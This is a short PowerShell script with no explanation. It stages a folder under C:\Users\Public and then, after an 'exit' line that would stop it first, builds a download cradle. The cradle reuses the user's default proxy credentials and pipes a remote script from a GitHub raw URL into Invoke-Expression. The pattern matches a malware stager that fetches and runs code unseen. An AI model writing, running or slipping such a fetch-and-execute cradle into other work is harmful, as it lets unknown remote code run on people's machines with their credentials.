
C:

if (!(Test-Path "C:\Users\Public"))
{
	New-Item -Path 'C:\Users\Public' -ItemType Directory
	Set-Location -Path C:\Users\Public
}
else
{
	Set-Location -Path C:\Users\Public
}

mkdir euro-yen
exit

$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
IEX($browser.DownloadString("https://raw.githubusercontent.com/argene-nyc/sevilla/master/3opfile.ps1"))

